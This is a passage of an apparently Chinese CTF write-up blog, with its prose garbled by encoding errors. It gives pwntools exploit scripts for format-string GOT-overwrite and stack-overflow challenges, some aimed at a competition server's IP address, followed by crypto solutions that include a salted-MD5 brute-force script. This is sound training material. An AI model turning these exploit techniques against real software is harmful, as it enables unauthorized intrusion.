class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span><span class="token comment" spellcheck="true">#Ë¶ÜÁõñfflushÂú∞ÂùÄÊåáÂêëÁöÑÂÜÖÂÆπÔºå‰ªéËÄåÂÆûÁé∞read_flagË∑≥ËΩ¨</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" class="lazyload"></p><h3 id="pwn2‚ÄìÊ†àÊ∫¢Âá∫"><a href="#pwn2‚ÄìÊ†àÊ∫¢Âá∫" class="headerlink" title="pwn2‚ÄìÊ†àÊ∫¢Âá∫"></a>pwn2‚ÄìÊ†àÊ∫¢Âá∫</h3><blockquote><p>ÁÆÄÂçïÁöÑÊ†àÊ∫¢Âá∫Âï¶ÔºåÂæàÂ∏∏ËßÅÁöÑÔºåÊâæÂà∞Ê∫¢Âá∫ÁÇπÁÑ∂ÂêéÊääEIPÊåáÂêëÊàë‰ª¨ÁöÑ<code>win</code>ÂáΩÊï∞Âú∞ÂùÄÂç≥ÂèØ:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" class="lazyload"></p><p>ÈÄöËøá<code>gdb-peda</code>,patternÊ®°ÂùóÔºåÊâæÂà∞Ê∫¢Âá∫ÂÅèÁßªÈáè‰∏∫76Ôºå‰πüÂ∞±ÊòØËØ¥Âè™ÈúÄË¶ÅÊûÑÈÄ†<code>76*&#39;a&#39; + win_addr</code>Âç≥ÂèØ:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" class="lazyload"></p></blockquote><p>ÊûÑÈÄ†exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#ida‰∏≠ÊúâwinÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span><span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûú(Âõ†‰∏∫ÁéØÂ¢ÉÂ∑≤ÁªèÂÖ≥Èó≠ÔºåÊâÄ‰ª•Âè™ËÉΩÂ±ïÁ§∫Êú¨Âú∞ÊïàÊûú):</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a99272847.png" class="lazyload"></p><h3 id="pwn3‚Äìret2syscall"><a href="#pwn3‚Äìret2syscall" class="headerlink" title="pwn3‚Äìret2syscall"></a>pwn3‚Äìret2syscall</h3><blockquote><p>pwn3ÁöÑËØùÁ®çÂæÆÊØî‰∏äÈù¢‰∏§È¢òË¶ÅÈöæ‰∏ä‰∏ÄÁÇπÁÇπÔºå‰∏çËøáËøòÂú®ÊàëËøô‰∏™ËêåÊñ∞ÁöÑÊâøÂèóËåÉÂõ¥‰πãÂÜÖÔºåÂÖàÊ£ÄÊü•‰∏Ä‰∏ã‰øùÊä§Êé™ÊñΩÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞Âè™ÊòØÂºÄ‰∫ÜÊ†à‰∏çÂèØÊâßË°å ÔºàNX)ÔºåÈùôÊÄÅÂàÜÊûê‰∏ÄÊ≥¢:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" class="lazyload"></p><p>ËøôÈáåÊàë‰ª¨‰πüÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™win_funcÂáΩÊï∞ÔºåÁåúÊµãÂêåÊ†∑ÊòØÂà©Áî®ËøîÂõûÂà∞ËØ•ÂáΩÊï∞‰ªéËÄåÂæóÂà∞flagÔºåÈÇ£‰πàÂ¶Ç‰ΩïËøîÂõûÂà∞Ëøô‰∏™win_funcÂáΩÊï∞Âë¢Ôºü</p><p>Êàë‰ª¨Ê≥®ÊÑèÂà∞mem_testÂáΩÊï∞‰º™c‰ª£Á†ÅÂ¶Ç‰∏ã:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" class="lazyload"></p><p>Áõ¥Êé•<code>return result</code>ÔºåÈÇ£‰πàÂ¶ÇÊûúÊúâÊ∫¢Âá∫Â≠òÂú®ÔºåÈÇ£Êàë‰ª¨ËÉΩ‰∏çËÉΩË¶ÜÁõñÊéâËøô‰∏™ÂáΩÊï∞ÁöÑËøîÂõûÂú∞ÂùÄÂë¢ÔºåÈÇ£ÂΩìÁÑ∂ÊòØÂèØË°åÁöÑ(ËøôÈ¢ò‰∏çËÉΩÁõ¥Êé•Áî®pattern createÂæóÂà∞ÂÅèÁßªÈáèÔºåÂ¶ÇÊûúpatternËøáÂ§ßÂàô‰ºöÂØºËá¥Êó†Ê≥ïË¶ÜÁõñeipÔºâÔºåÁî®gdbÂú®mem_testÂáΩÊï∞‰∏ãÊñ≠ÁÇπË∞ÉËØïÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" class="lazyload"></p><p>ÁÑ∂ÂêéÊ†πÊçÆ‰πãÂâçidaÂàÜÊûêÂèòÈáèsÁöÑ‰ΩçÁΩÆ‰∏∫<code>ebp-0x13</code>,Êàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÔºå<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>ÔºåÊàñËÄÖÁõ¥Êé•Âú®gdbÁúãebpÁöÑÂÄºÔºåÂèØ‰ª•Áü•ÈÅì<code>0x8048718</code>Â∞±ÊòØreturnËøîÂõûÁöÑÂú∞ÂùÄ„ÄÇÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂÆÉË¶ÜÁõñÊàêwin_funcÁöÑÂú∞ÂùÄ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" class="lazyload"></p><p>ËÄåcatflagÂú∞ÂùÄÂ∞±ÊòØ‰∏ÄÂºÄÂßãËæìÂá∫ÁöÑÈÇ£‰∏™hint:<code>0x080487E0</code></p></blockquote><p>ÊûÑÈÄ†expÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./memory"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token comment" spellcheck="true">#io = process("./memory")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20012'</span><span class="token punctuation">)</span>catflag <span class="token operator">=</span> <span class="token number">0x080487E0</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_func'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#paddingÁî±Ê†àÁ©∫Èó¥Âíåebp(0x13+4)ÁªÑÊàêÔºåsystem('cat flag')Áî±systemÂáΩÊï∞ÂíåcatflagÂèÇÊï∞‰ª•ÂèäsystemËøîÂõûÂú∞ÂùÄÁªÑÊàê</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">,</span> <span class="token number">0x08048677</span><span class="token punctuation">,</span> catflag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd592283dd2f.png" class="lazyload"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto1-ÊàëËøôÂØÜÁ†ÅÂøò‰∫Ü„ÄÇ„ÄÇ„ÄÇ"><a href="#Crypto1-ÊàëËøôÂØÜÁ†ÅÂøò‰∫Ü„ÄÇ„ÄÇ„ÄÇ" class="headerlink" title="Crypto1-ÊàëËøôÂØÜÁ†ÅÂøò‰∫Ü„ÄÇ„ÄÇ„ÄÇ"></a>Crypto1-ÊàëËøôÂØÜÁ†ÅÂøò‰∫Ü„ÄÇ„ÄÇ„ÄÇ</h3><blockquote><p>È¢òÈù¢Êúâ‰∏Ä‰∏≤base64ÔºöVTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</p><p>ËøûÁª≠Ëß£Á†ÅÂç≥ÂèØÂæóÂà∞ÔºöSK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</p><p>Êèê‰∫§Âç≥ÂèØ„ÄÇ</p></blockquote><h3 id="Crypto2-‰∫åÊàòÊó∂ÊúüÁöÑÂØÜÁ†Å"><a href="#Crypto2-‰∫åÊàòÊó∂ÊúüÁöÑÂØÜÁ†Å" class="headerlink" title="Crypto2-‰∫åÊàòÊó∂ÊúüÁöÑÂØÜÁ†Å"></a>Crypto2-‰∫åÊàòÊó∂ÊúüÁöÑÂØÜÁ†Å</h3><blockquote><p>ÊçÆËØ¥ÊòØÊüêÂπ≥Âè∞ÂéüÈ¢òÔºåÁîöËá≥‰∏ìÈó®ÂéªÊü•‰∫Ü‰∏Ä‰∏ã‰∫åÊàòÊó∂ÊúüÁöÑÂØÜÁ†ÅÂ≠¶ÔºåÈ¢òÈù¢Ôºö</p><pre class=" language-c"><code class="language-c">Â∑≤Áü•Â∞Ü‰∏Ä‰∏™flag‰ª•‰∏ÄÁßçÂä†ÂØÜÂΩ¢Âºè‰∏∫‰ΩøÁî®ÂØÜÈí•ËøõË°åÂä†ÂØÜÔºå‰ΩøÁî®ÂØÜÈí•WELCOMETOCFFÂä†ÂØÜÂêéÂØÜÊñá‰∏∫<span class="token number">000000000000000000000000000000000000000000000000000101110000110001000000101000000001</span>ÔºåËØ∑ÂàÜÊûêÂá∫flag</code></pre><p>WELCOMETOCFF‰∏∫ÂØÜÈí•ÔºåÈïøÂ∫¶‰∏∫12ÔºåËÄå‰∫åËøõÂà∂‰∏≤ÈïøÂ∫¶‰∏∫84ÔºåÊó¢ÁÑ∂ÂØÜÊñá‰∏∫‰∫åËøõÂà∂ÔºåÈÇ£‰πàÂèØ‰ª•ÊÉ≥Âà∞ÁöÑÊØîËæÉÁÆÄÂçïÁöÑÂä†ÂØÜÊìç‰ΩúÂ∞±ÊòØÊåâ‰Ωç‰∏éÔºåÊåâ‰ΩçÊàñÔºå‰ª•ÂèäÊåâ‰ΩçÂºÇÊàñ„ÄÇ</p><p>Â∞ùËØïÂêéÂèëÁé∞ÊòØÂºÇÊàñÊìç‰ΩúÔºåÂ∞ÜWELCOMETOCFFÔºåÂàÜÂà´Áî®‰∏É‰Ωç‰∫åËøõÂà∂Ë°®Á§∫ÂÖ∂Âú®Â≠óÊØçË°®‰∏≠ÁöÑÈ°∫Â∫èÔºåÂπ∂‰∏îÊØèÂØπÂ∫îÁöÑ‰∏É‰ΩçËøõË°åÂºÇÊàñÊìç‰ΩúÔºö</p><pre class=" language-c"><code class="language-c">ÂØÜÊñá<span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0000000</span> <span class="token number">0010111</span> <span class="token number">0000110</span> <span class="token number">0010000</span> <span class="token number">0010100</span> <span class="token number">0000001</span>XORÂØÜÈí•W E L C O M E T O C F F<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0010100</span> <span class="token number">0001111</span> <span class="token number">0000011</span> <span class="token number">0000110</span> <span class="token number">0000110</span>ÂæóÂà∞Ôºö<span class="token number">0010111</span> <span class="token number">0000101</span> <span class="token number">0001100</span> <span class="token number">0000011</span> <span class="token number">0001111</span> <span class="token number">0001101</span> <span class="token number">0000101</span> <span class="token number">0000011</span> <span class="token number">0001001</span> <span class="token number">0010011</span> <span class="token number">0010010</span> <span class="token number">0000111</span>W E L C O M E C I S R G<span class="token operator">==</span><span class="token operator">></span> flag<span class="token punctuation">{</span>WELCOMECISRG<span class="token punctuation">}</span></code></pre><p>Êèê‰∫§Âç≥ÂèØ„ÄÇ</p></blockquote><h3 id="Crypto3-Ë¢´Èªë‰∫ÜÔºåÊ±ÇÂØÜÁ†Å"><a href="#Crypto3-Ë¢´Èªë‰∫ÜÔºåÊ±ÇÂØÜÁ†Å" class="headerlink" title="Crypto3-Ë¢´Èªë‰∫ÜÔºåÊ±ÇÂØÜÁ†Å"></a>Crypto3-Ë¢´Èªë‰∫ÜÔºåÊ±ÇÂØÜÁ†Å</h3><blockquote><p>Êë©ÊñØÁîµÁ†ÅËß£Á†ÅÂç≥ÂèØÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5dc8906c6b.png" class="lazyload"></p><p>flag:JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</p></blockquote><h3 id="Crypto4-Âá∫Ëà™‰∫Ü-Âá∫Ëà™Âï¶ÔºÅÔºÅ"><a href="#Crypto4-Âá∫Ëà™‰∫Ü-Âá∫Ëà™Âï¶ÔºÅÔºÅ" class="headerlink" title="Crypto4-Âá∫Ëà™‰∫Ü~Âá∫Ëà™Âï¶ÔºÅÔºÅ"></a>Crypto4-Âá∫Ëà™‰∫Ü~Âá∫Ëà™Âï¶ÔºÅÔºÅ</h3><blockquote><p>Ê†πÊçÆÈ¢òÈù¢ÔºåÂ∞ùËØïËøõË°åÂØπËØ∑Ê±ÇÁ±ªÂûãËøõË°åËøáÊª§ÔºåÂèëÁé∞POSTËØ∑Ê±ÇÂè™Êúâ‰∏Ä‰∏™ÔºåÂπ∂‰∏îÊúâuseridÂíåpswrdÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5dd387aca9.png" class="lazyload"></p><p>Â∞ùËØïÂ∞ÜpswrdÁöÑÂÄºËß£Á†ÅÂêéÊèê‰∫§flagÔºåÊàêÂäü„ÄÇ</p></blockquote><h3 id="Crypto5-IDCÂØÜÁ†ÅÁ†¥Ëß£-Êú™Ëß£Âá∫"><a href="#Crypto5-IDCÂØÜÁ†ÅÁ†¥Ëß£-Êú™Ëß£Âá∫" class="headerlink" title="Crypto5-IDCÂØÜÁ†ÅÁ†¥Ëß£(Êú™Ëß£Âá∫)"></a>Crypto5-IDCÂØÜÁ†ÅÁ†¥Ëß£(Êú™Ëß£Âá∫)</h3><blockquote><p>ÁªôÂá∫‰∏Ä‰∏≤Â≠óÁ¨¶<code>js4163633181327481</code></p><p>ÂÆåÂÖ®ËÑëÊ¥ûÈ¢òÔºöÊâãÊú∫‰πùÈîÆ<code>4163633181327481</code>ÔºåÊ≤°Áî®ËøáÁöÑÂíãÊ¥ª„ÄÇ„ÄÇ„ÄÇ</p></blockquote><h3 id="Crypto6-Ë∂ÖÁ∫ßÂØÜÁ†Å"><a href="#Crypto6-Ë∂ÖÁ∫ßÂØÜÁ†Å" class="headerlink" title="Crypto6-Ë∂ÖÁ∫ßÂØÜÁ†Å"></a>Crypto6-Ë∂ÖÁ∫ßÂØÜÁ†Å</h3><blockquote><p>ËøôÈ¢òÁªôÂá∫‰∫ÜÂ§ßÈáèÁöÑmd5ÂÄºÔºå‰ª•ÂèäÁ±ª‰ºº‰∫ébase64Ê†ºÂºèÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂæàÂÆπÊòìÂ∞±ÊÉ≥Âà∞hashÂä†Áõê(salt)ÁöÑÈóÆÈ¢òÔºåËÄå‰∏îÈöêÁ∫¶ËÆ∞Âæó‰πãÂâçÂú®Âì™ÁúãÂà∞ËøáËøô‰∏™È¢ò„ÄÇ</p><p>ËÑöÊú¨ÁàÜÁ†¥ÔºàÊó∂Èó¥ÂéüÂõ†ÔºåÁõ¥Êé•‰ªé1234567880ÂºÄÂßãÔºâÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> numba <span class="token keyword">import</span> jit@jit<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    password <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span><span class="token punctuation">,</span><span class="token string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span><span class="token punctuation">,</span><span class="token string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span><span class="token punctuation">,</span><span class="token string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span><span class="token punctuation">,</span><span class="token string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span><span class="token punctuation">,</span><span class="token string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span><span class="token punctuation">,</span><span class="token string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span><span class="token punctuation">,</span><span class="token string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span><span class="token punctuation">,</span><span class="token string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span><span class="token punctuation">,</span><span class="token string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span><span class="token punctuation">,</span><span class="token string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span><span class="token punctuation">,</span><span class="token string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span><span class="token punctuation">,</span><span class="token string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span><span class="token punctuation">,</span><span class="token string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span><span class="token punctuation">,</span><span class="token string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span><span class="token punctuation">,</span><span class="token string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span><span class="token punctuation">,</span><span class="token string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span><span class="token punctuation">,</span><span class="token string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span><span class="token punctuation">,</span><span class="token string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span><span class="token punctuation">,</span><span class="token string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span><span class="token punctuation">,</span><span class="token string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span><span class="token punctuation">,</span><span class="token string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span><span class="token punctuation">,</span><span class="token string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span><span class="token punctuation">,</span><span class="token string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span><span class="token punctuation">,</span><span class="token string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span><span class="token punctuation">,</span><span class="token string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span><span class="token punctuation">,</span><span class="token string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span><span class="token punctuation">,</span><span class="token string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span><span class="token punctuation">,</span><span class="token string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span><span class="token punctuation">,</span><span class="token string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span><span class="token punctuation">,</span><span class="token string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span><span class="token punctuation">,</span><span class="token string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span><span class="token punctuation">,</span><span class="token string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span><span class="token punctuation">,</span><span class="token string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span><span class="token punctuation">,</span><span class="token string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span><span class="token punctuation">,</span><span class="token string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span><span class="token punctuation">,</span><span class="token string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span><span class="token punctuation">,</span><span class="token string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span><span class="token punctuation">,</span><span class="token string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span><span class="token punctuation">,</span><span class="token string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span><span class="token punctuation">,</span><span class="token string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span><span class="token punctuation">,</span><span class="token string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span><span class="token punctuation">,</span><span class="token string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span><span class="token punctuation">,</span><span class="token string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span><span class="token punctuation">,</span><span class="token string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span><span class="token punctuation">,</span><span class="token string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span><span class="token punctuation">,</span><span class="token string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span><span class="token punctuation">,</span><span class="token string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span><span class="token punctuation">,</span><span class="token string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span><span class="token punctuation">,</span><span class="token string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span><span class="token punctuation">,</span><span class="token string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span><span class="token punctuation">,</span><span class="token string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span><span class="token punctuation">,</span><span class="token string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span><span class="token punctuation">,</span><span class="token string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span><span class="token punctuation">,</span><span class="token string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span><span class="token punctuation">,</span><span class="token string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span><span class="token punctuation">,</span><span class="token string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span><span class="token punctuation">,</span><span class="token string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span><span class="token punctuation">,</span><span class="token string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span><span class="token punctuation">,</span><span class="token string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span><span class="token punctuation">,</span><span class="token string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span><span class="token punctuation">,</span><span class="token string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span><span class="token punctuation">,</span><span class="token string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span><span class="token punctuation">,</span><span class="token string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span><span class="token punctuation">,</span><span class="token string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span><span class="token punctuation">,</span><span class="token string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">1234567880</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            salt <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            md5 <span class="token operator">=</span> password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span>            mingwen <span class="token operator">=</span> <span class="token string">"{FLAG:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token operator">+</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            miwen <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mingwen<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>miwen <span class="token operator">==</span> md5<span class="token punctuation">)</span> <span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>mingwen<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                n<span class="token operator">=</span><span class="token number">10000000000</span>                <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" class="lazyload"></p><p>flag:1234567890</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-‰ºöÈ£ûÁöÑÁãóÁãó"><a href="#Misc1-‰ºöÈ£ûÁöÑÁãóÁãó" class="headerlink" title="Misc1-‰ºöÈ£ûÁöÑÁãóÁãó"></a>Misc1-‰ºöÈ£ûÁöÑÁãóÁãó</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" class="lazyload"></p><p>Áõ¥Êé•Êü•ÁúãÊñá‰ª∂ÂÜÖÂÆπÂèØ‰ª•ÂæóÂà∞Êú´Â∞æÁöÑbase64Â≠óÁ¨¶‰∏≤ÔºåÊé•Ëß£Á†ÅÂæóÂà∞flag</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e6629e3e4.png" class="lazyload"></p><h3 id="Misc2-Êñá‰ª∂Á±ªÂûãÂàÜÊûê"><a href="#Misc2-Êñá‰ª∂Á±ªÂûãÂàÜÊûê" class="headerlink" 